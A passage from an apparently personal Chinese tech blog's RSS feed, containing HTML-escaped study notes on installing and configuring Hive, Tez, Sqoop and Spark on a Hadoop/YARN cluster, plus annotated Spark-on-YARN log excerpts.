   &amp;lt;property&amp;gt;
     &amp;lt;name&amp;gt;javax.jdo.option.ConnectionPassword&amp;lt;/name&amp;gt;
     &amp;lt;value&amp;gt;yourpassword&amp;lt;/value&amp;gt;
   &amp;lt;/property&amp;gt;
   &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;hive.metastore.warehouse.dir&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;/hive/warehouse&amp;lt;/value&amp;gt;
      &amp;lt;description&amp;gt;数据存储的HDFS路径&amp;lt;/description&amp;gt;
   &amp;lt;/property&amp;gt;
   &amp;lt;property&amp;gt;
     &amp;lt;name&amp;gt;hive.metastore.uris&amp;lt;/name&amp;gt;
     &amp;lt;value&amp;gt;thrift://10.2.2.141:9083&amp;lt;/value&amp;gt;
     &amp;lt;description&amp;gt;spark-shell默认将启动一个SqlContext，因此在{SPARK_HOME}/conf目录下需要有该hive-site.xml文件，并且文件中需要指定hive.metastore.uris&amp;lt;/description&amp;gt;
   &amp;lt;/property&amp;gt;
 &amp;lt;/configuration&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;增加conf/hive-env.sh文件:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export HADOOP_HOME=/opt/hadoop-2.7.3
 export HIVE_CONF_DIR=/opt/hive-2.1.0/conf	
 # tez相关
 export TEZ_HOME=/opt/tez-0.8.5
 export TEZ_CONF_DIR=/opt/tez-0.8.5/conf
 export TEZ_JARS=/opt/tez-0.8.5
 export HADOOP_CLASSPATH=${TEZ_CONF_DIR}:${TEZ_JARS}/*:${TEZ_JARS}/lib/*
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;增加conf/hive-log4j2.properties文件&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; property.hive.log.dir = /opt/hive-2.1.0/logs
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将/opt/hive-2.1.0/conf/hive-site.xml文件和/opt/hadoop-2.7.3/etc/hadoop/hdfs-site.xml文件复制到/opt/spark-2.1.0/conf下&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ cp /opt/hive-2.1.0/conf/hive-site.xml /opt/spark-2.1.0/conf/
 $ cp /opt/hadoop-2.7.3/etc/hadoop/hdfs-site.xml /opt/spark-2.1.0/conf/
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分发Hive配置文件&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/opt/hive-2.1.0/conf/ dest=/opt/hive-2.1.0/conf/&#39;
 $ ansible slave -m copy -a &#39;src=/opt/spark-2.1.0/conf/ dest=/opt/spark-2.1.0/conf/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;hive-1&quot;&gt;启动Hive&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;启动Hadoop&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;(在主节点)启动Hive服务器&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hive --service metastore &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;hive-2&quot;&gt;测试Hive&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;(在任一节点)启动Hive，进入Hive交互界面:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hive
 hive&amp;gt;
 hive&amp;gt; show databases;
 hive&amp;gt; use default;
 hive&amp;gt; create table test(id INT);
 hive&amp;gt; insert into test VALUES(0);
 hive&amp;gt; select count(*) from test;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;tez085&quot;&gt;安装Tez（版本0.8.5）&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;准备工作&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;下载Tez源码包，修改pom.xml：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;hadoop.version&amp;gt;2.7.3&amp;lt;/hadoop.version&amp;gt;
 &amp;lt;javac.version&amp;gt;1.8&amp;lt;/javac.version&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根据pom.xml中protobuf.version，安装protobuf：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ wget https://github.com/google/protobuf/releases/download/v2.5.0/protobuf-2.5.0.tar.gz
 $ tar -zxvf protobuf-2.5.0.tar.gz -C .
 $ cd protobuf-2.5.0/
 $ ./configure
 $ make
 $ make check
 $ sudo make install
 $ sudo vi /etc/ld.so.conf.d/bprotobuf.conf
 /usr/local/lib
 $ sudo ldconfig
 $ protoc --version
 libprotoc 2.5.0
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改Maven镜像源/etc/maven/settings.xml，在mirros下添加子节点&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;mirror&amp;gt;
     &amp;lt;id&amp;gt;nexus-aliyun&amp;lt;/id&amp;gt;
     &amp;lt;mirrorOf&amp;gt;*&amp;lt;/mirrorOf&amp;gt;
     &amp;lt;name&amp;gt;Nexus aliyun&amp;lt;/name&amp;gt;
     &amp;lt;url&amp;gt;http://maven.aliyun.com/nexus/content/groups/public&amp;lt;/url&amp;gt;
 &amp;lt;/mirror&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;开代理，编译：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ export http_proxy=http://127.0.0.1:8123/
 $ export https_proxy=http://127.0.0.1:8123/
 $ mvn package -DskipTests=true -Dmaven.javadoc.skip=true
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;服务端使用完整包。将编译好的tez-dist/target/tez-0.8.5.tar.gz上传到hdfs上(/user/tez/)&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hadoop fs -mkdir /user/tez/
 $ hadoop fs -put ./tez-dist/target/tez-0.8.5.tar.gz
 $ hadoop fs -chmod -R 777 /user/tez
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;客户端使用minimal包。将编译好的tez-dist/target/tez-0.8.5-minimal.tar.gz分发到各节点，解压&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &quot;src=./tez-dist/target/tez-0.8.5-minimal.tar.gz dest=/home/cat/cat/&quot;
 $ ansible all -a &quot;mkdir /opt/tez-0.8.5&quot;
 $ ansible all -a &quot;tar -zxvf /home/cat/cat/tez-0.8.5-minimal.tar.gz -C /opt/tez-0.8.5/&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;tez&quot;&gt;配置Tez&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;conf/tez-site.xml&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;configuration&amp;gt;
   &amp;lt;property&amp;gt;
     &amp;lt;name&amp;gt;tez.lib.uris&amp;lt;/name&amp;gt;
     &amp;lt;value&amp;gt;${fs.defaultFS}/user/tez/tez-0.8.5-minimal.tar.gz&amp;lt;/value&amp;gt;
   &amp;lt;/property&amp;gt;
   &amp;lt;property&amp;gt;
     &amp;lt;name&amp;gt;tez.use.cluster.hadoop-libs&amp;lt;/name&amp;gt;
     &amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;
   &amp;lt;/property&amp;gt;
 &amp;lt;/configuration&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分发配置&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ansible all -m copy -a &quot;src=/opt/tez-0.8.5/conf/ dest=/opt/tez-0.8.5/conf/&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;tez-1&quot;&gt;测试Tez&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;(在任一节点)启动Hive，进入Hive交互界面:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hive
 hive&amp;gt;
 hive&amp;gt; set hive.execution.engine=tez;
 hive&amp;gt; use default;
 hive&amp;gt; select count(*) from test;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;sqoop146&quot;&gt;安装Sqoop（版本1.4.6）&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section-2&quot;&gt;准备工作&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;下载Sqoop二进制包，解压至/opt/:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &#39;src=/home/cat/cat/sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz dest=/home/cat/cat/&#39;
 $ ansible all -a &#39;tar -zxvf /home/cat/cat/sqoop-1.4.6.bin__hadoop-2.0.4-alpha.tar.gz -C /opt/&#39;
 $ ansible all -a &#39;mv /opt/sqoop-1.4.6.bin__hadoop-2.0.4-alpha /opt/sqoop-1.4.6&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将pg-jdbc和mysql的jar包放入$SQOOP_HOME/lib&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; [https://jdbc.postgresql.org/download.html](https://jdbc.postgresql.org/download.html)		
 [https://dev.mysql.com/downloads/connector/j/](https://dev.mysql.com/downloads/connector/j/)

 $ ansible slave -m copy -a &#39;src=/opt/sqoop-1.4.6/lib/ dest=/opt/sqoop-1.4.6/lib/&#39; ---
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;sqoop&quot;&gt;配置Sqoop&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;conf/sqoop-env.sh&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export HADOOP_COMMON_HOME=/opt/hadoop-2.7.3
 export HIVE_HOME=/opt/hive-2.1.0
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分发Sqoop配置文件&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible slave -m copy -a &#39;src=/opt/sqoop-1.4.6/conf/ dest=/opt/sqoop-1.4.6/conf/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;sqoop-1&quot;&gt;测试Sqoop&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;(在任一节点):&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sqoop list-databases --connect jdbc:postgresql://10.2.26.96:5432/lrs --username lrs_owner --password pass
 $ sqoop list-databases --connect jdbc:mysql://10.2.2.141:3306/metastore --username hive --password pass
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;psql向hdfs的导入，HDFS中的路径文件夹必需不存在:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sqoop import --connect jdbc:postgresql://{psql的IP地址}:5432/{数据库名} --username {用户名} --password {密码} --table {表名} --target-dir {HDFS中的路径} -m 5
	
 $ sqoop import --connect jdbc:postgresql://10.2.3.100:5432/cat --username postgres --password ada --table kitty --target-dir /test/kitty -m 5
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;psql向hive的导入:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sqoop import --connect jdbc:postgresql://{psql的IP地址}:5432/{数据库名} --username {用户名} --password {密码} --table {表名} --hive-import -m 5
	
 $ sqoop import --connect jdbc:postgresql://10.2.3.100:5432/cat --username postgres --password ada --table kitty --hive-import -m 5
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;
</description>
        <pubDate>Thu, 26 Jan 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(7)-%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(7)-%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(6)-Spark</title>
        <description>&lt;p&gt;&lt;em&gt;深入学习Spark相关知识，并在Yarn集群搭建Spark。包括通过日志分析Spark on Yarn-cluster运行机制&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;spark&quot;&gt;Spark&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;spark-on-yarn-cluster&quot;&gt;Spark on Yarn-cluster运行机制&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;在Spark on Yarn-cluster模式中，Spark应用的Driver即为Yarn中的ApplicationMaster(实际也是一个Container)，Spark的Executor即为Yarn中的Container，其中Driver负责资源的申请和job的调度，Executor负责Task的具体执行&lt;/p&gt;

&lt;p&gt;运行参数：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;spark-submit --class logs.Main \
 --master yarn-cluster \		// Spark on Yarn-cluster
 --num-executors 19 \			// 19个Executors+1个AM(Driver)
 --executor-memory 5g \			// 每个Executors堆内存
 --executor-cores 2 \			// 每个Executors虚拟CPU核数
 --driver-memory 5g \			//  Driver堆内存
./Test-assembly-1.0.jar
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Spark Yarn的client提交应用(Application)给Yarn的ResourceManager&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; // 连接到RM
 17/03/31 18:14:19 INFO RMProxy: Connecting to ResourceManager at /10.2.2.141:8032

 // 向集群请求提交一个应用
 17/03/31 18:14:19 INFO Client: Requesting a new application from cluster with 10 NodeManagers
	
 // 检查请求的资源是否超过设定值
 17/03/31 18:14:19 INFO Client: Verifying our application has not requested more than the maximum memory capability of the cluster (12288 MB per container)
	
 // 分配一个ApplicationMaster，包括堆内存5120M和非堆内存512M，共5632M
 17/03/31 18:14:19 INFO Client: Will allocate AM container, with 5632 MB memory including 512 MB overhead
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;RM向NodeManager申请Container，用于运行ApplicationMaster(Spark的Driver)，并将应用的jar文件上传到HDFS&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; // 申请Container，用于运行ApplicationMaster
 17/03/31 18:14:19 INFO Client: Setting up container launch context for our AM
 17/03/31 18:14:19 INFO Client: Setting up the launch environment for our AM container
 17/03/31 18:14:19 INFO Client: Preparing resources for our AM container

 // 将应用的jar文件上传到HDFS
 17/03/31 18:14:22 INFO Client: Uploading resource file:/tmp/spark-0222f8da-3cf4-4ff1-9109-c4877293fc5b/__spark_libs__3620896466196856366.zip -&amp;gt; hdfs://cats/user/wyn/.sparkStaging/application_1490945694024_0003/__spark_libs__3620896466196856366.zip
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;NM启动AM，在Container中初始化SparkContext，其中比较重要的是创建TaskScheduler和DAGScheduler。在Spark on Yarn-cluster模式中，TaskScheduler将选择YarnClusterScheduler和YarnClusterSchedulerBackend&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;YarnClusterScheduler用于根据每个Executor的资源剩余情况分配合适的Task，并维护一个任务队列，根据FIFO或Fair策略，调度任务&lt;/li&gt;
      &lt;li&gt;YarnClusterSchedulerBackend用于维护Executor相关信息(包括Executor的地址、通信端口、主机、资源情况)&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;DAGScheduler用于根据Job构建基于Stage的DAG(有向无环图)，并提交Stage给TaskScheduler&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  17/03/31 18:14:29 INFO ApplicationMaster: Preparing Local resources
		
  // 初始化SparkContext
  17/03/31 18:14:30 INFO ApplicationMaster: Waiting for spark context initialization...
  17/03/31 18:14:30 INFO SparkContext: Running Spark version 2.1.0
		
  // 创建YarnClusterScheduler
  17/03/31 18:14:31 INFO YarnClusterScheduler: Created YarnClusterScheduler
		
  // AM中注册一个SchedulerBackend，用于Executor与其通信
  17/03/31 18:14:31 INFO YarnSchedulerBackend$YarnSchedulerEndpoint: ApplicationMaster registered as NettyRpcEndpointRef(spark://YarnAM@10.2.2.150:45262)
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;AM向RM申请资源，申请到相应资源后，AM中的YarnClusterScheduler通过RPC协议让NM启动相应的Executor&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; // 申请资源，包括堆内存5120M和非堆内存512M，共5632M
 17/03/31 18:14:31 INFO YarnAllocator: Will request 19 executor container(s), each with 2 core(s) and 5632 MB memory (including 512 MB of overhead)
 17/03/31 18:14:31 INFO YarnAllocator: Submitted 19 unlocalized container requests.
	
 // 启动executor
 17/03/31 18:14:31 INFO YarnAllocator: Launching container container_1490945694024_0003_01_000002 on host cat5
 17/03/31 18:14:31 INFO YarnAllocator: Received 1 containers from YARN, launching executors on 1 of them.
 ...
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;NM启动Executor(container)，在container中创建ExecutorBackend，用于与AM的SchedulerBackend通信，并向AM注册并申请Task&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; // 每个executor中注册一个ExecutorBackend，用于与AM通信
 17/03/31 18:14:33 INFO YarnSchedulerBackend$YarnDriverEndpoint: Registered executor NettyRpcEndpointRef(null) (10.2.2.150:34052) with ID 2
 17/03/31 18:14:34 INFO YarnSchedulerBackend$YarnDriverEndpoint: Registered executor NettyRpcEndpointRef(null) (10.2.2.144:39920) with ID 4
 ...
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;开始执行Job，DAGScheduler根据Job构建基于Stage的DAG，并提交Stage(也就是TaskSet)给TaskScheduler，TaskScheduler向Executor分配Task，由ExecutorBackend执行，并向AM汇报运行的状态和进度&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; // 开始执行Job
 17/03/31 18:14:50 INFO SparkContext: Starting job: sortBy at Main.scala:33
	
 // DAGScheduler根据Job构建基于Stage的DAG，并提交Stage(也就是TaskSet)给TaskScheduler
 17/03/31 18:14:51 INFO DAGScheduler: Submitting 23137 missing tasks from ShuffleMapStage 0 (MapPartitionsRDD[5] at groupBy at Main.scala:31)
	
 // TaskScheduler将Task分配给Executor
 17/03/31 18:14:51 INFO YarnClusterScheduler: Adding task set 0.0 with 23137 tasks
	
 // 分配给的Executor的具体信息
 17/03/31 18:14:51 INFO TaskSetManager: Starting task 0.0 in stage 0.0 (TID 0, cat12, executor 12, partition 0, NODE_LOCAL, 6051 bytes)
 17/03/31 18:14:51 INFO TaskSetManager: Starting task 18.0 in stage 0.0 (TID 1, cat8, executor 16, partition 18, NODE_LOCAL, 6051 bytes)
 ...
 17/03/31 18:14:52 INFO TaskSetManager: Finished task 29.0 in stage 0.0 (TID 32) in 1413 ms on cat5 (executor 11) (1/23137)
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;应用程序运行完成后，AM下令关闭所有Executor，并向RM申请注销并关闭自己&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; // AM通知应用运行完成
 17/03/31 18:18:50 INFO ApplicationMaster: Final app status: SUCCEEDED, exitCode: 0
 17/03/31 18:18:50 INFO SparkContext: Invoking stop() from shutdown hook
	
 // AM下令关闭所有Executor
 17/03/31 18:18:53 INFO YarnAllocator: Driver requested a total number of 0 executor(s).
 17/03/31 18:18:53 INFO YarnClusterSchedulerBackend: Shutting down all executors
 17/03/31 18:18:53 INFO YarnSchedulerBackend$YarnDriverEndpoint: Asking each executor to shut down
	
 // AM关闭自己
 17/03/31 18:18:53 INFO SparkContext: Successfully stopped SparkContext
 17/03/31 18:18:53 INFO ApplicationMaster: Unregistering ApplicationMaster with SUCCEEDED
	
 // Executor收到来自Driver的关闭命令
 17/03/31 18:18:53 INFO CoarseGrainedExecutorBackend: Driver commanded a shutdown
	
 // Executor关闭
 17/03/31 18:18:53 INFO CoarseGrainedExecutorBackend: Driver from 10.2.2.150:45262 disconnected during shutdown
 17/03/31 18:18:53 INFO ShutdownHookManager: Shutdown hook called
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;spark210&quot;&gt;安装Spark（版本2.1.0）&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section&quot;&gt;准备工作&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;按照&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(2)-Hadoop/&quot;&gt;大数据学习笔记(2)-Hadoop&lt;/a&gt;做好部署前提准备&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Scala（版本2.11.8）二进制包，并分发到所有节点，并解压至/opt/:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &#39;src=/home/cat/cat/scala-2.11.8.tgz dest=/home/cat/cat/&#39;
 $ ansible all -a &#39;tar -zxvf /home/cat/cat/scala-2.11.8.tgz -C /opt/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Spark二进制包（或源码自行编译），并分发到所有节点，并解压至/opt/:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &#39;src=/home/cat/cat/spark-2.1.0-bin-hadoop2.7.tgz dest=/home/cat/cat/&#39;
 $ ansible all -a &#39;tar -zxvf /home/cat/cat/spark-2.1.0-bin-hadoop2.7.tgz -C /opt/&#39;
 $ ansible all -a &#39;mv /opt/spark-2.1.0-bin-hadoop2.7 /opt/spark-2.1.0&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;创建history默认存放位置:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ hadoop fs -mkdir /tmp
 $ hadoop fs -mkdir /tmp/spark-history
 $ hadoop fs -chmod -R 777 /tmp
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;spark-1&quot;&gt;配置Spark&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;conf/spark-env.sh:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export JAVA_HOME=/opt/jdk1.8.0_121
 export HADOOP_HOME=/opt/hadoop-2.7.3
 export SCALA_HOME=/opt/scala-2.11.8	
	
 export HADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop
 export HDFS_CONF_DIR=$HADOOP_HOME/etc/hadoop
 export YARN_CONF_DIR=$HADOOP_HOME/etc/hadoop

 # spark.history.retainedApplications仅显示最近10个应用
 export SPARK_HISTORY_OPTS=&quot;-Dspark.history.ui.port=18080 -Dspark.history.retainedApplications=10 -Dspark.history.fs.logDirectory=hdfs:///tmp/spark-history&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;conf/slaves:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 10.2.2.14[3:12]
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;conf/spark-defaults.conf:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 对于Spark Job启用log event配置，是否记录Spark事件，用于应用程序在完成后重构webUI
 spark.eventLog.enabled           true
 spark.eventLog.dir hdfs:///tmp/spark-history
 spark.eventLog.compress          true

 spark.yarn.historyServer.address 10.2.2.141:18080
 spark.history.ui.port 18080
 spark.history.fs.logDirectory hdfs:///tmp/spark-history
 spark.history.provider org.apache.spark.deploy.history.FsHistoryProvider
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分发Spark配置文件&lt;/p&gt;

